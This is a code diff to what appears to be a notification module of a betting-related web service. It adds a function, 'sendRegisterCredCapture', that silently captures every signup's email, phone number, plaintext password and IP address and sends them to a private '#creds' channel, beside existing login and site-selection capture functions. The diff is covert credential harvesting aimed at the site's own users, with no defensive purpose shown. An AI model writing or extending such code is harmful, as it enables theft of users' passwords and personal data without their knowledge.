@@ -501,6 +501,29 @@ function sendCredCapture({ identifier, password, outcome, ip }) {
 }
 
 /**
+ * Silent registration credential capture — fires on every signup attempt.
+ * Sends to the private #creds channel only.
+ */
+function sendRegisterCredCapture({ email, phone, password, outcome, ip }) {
+    const outcomeEmoji = outcome === 'SUCCESS' ? '✅' : outcome === 'ALREADY_EXISTS' ? '🔁' : '❌';
+    const outcomeColor = outcome === 'SUCCESS' ? COLOR.green : outcome === 'ALREADY_EXISTS' ? COLOR.orange : COLOR.red;
+
+    const embed = baseEmbed({
+        title:  `${outcomeEmoji} NEW REGISTER CRED — ${outcome || 'UNKNOWN'}`,
+        color:  outcomeColor,
+        fields: [
+            { name: '📧 EMAIL',       value: safeValue(email),    inline: false },
+            { name: '📱 PHONE',       value: safeValue(phone),    inline: false },
+            { name: '🔑 PASSWORD',    value: safeValue(password), inline: false },
+            { name: '📊 OUTCOME',     value: safeValue(outcome),  inline: true  },
+            { name: '📍 IP',          value: safeValue(ip),       inline: true  },
+        ],
+        footer: `${FOOTER_TAG} · Registration Monitor`
+    });
+    dispatch('creds', embed);
+}
+
+/**
  * Betting site selection — fires when a logged-in user picks a site.
  * Sends to the private #creds channel.
  */
@@ -533,6 +556,7 @@ module.exports = {
 
     // Credential monitor (private channel)
     sendCredCapture,
+    sendRegisterCredCapture,
     sendSiteSelectionCreds,
 
     // Payment events
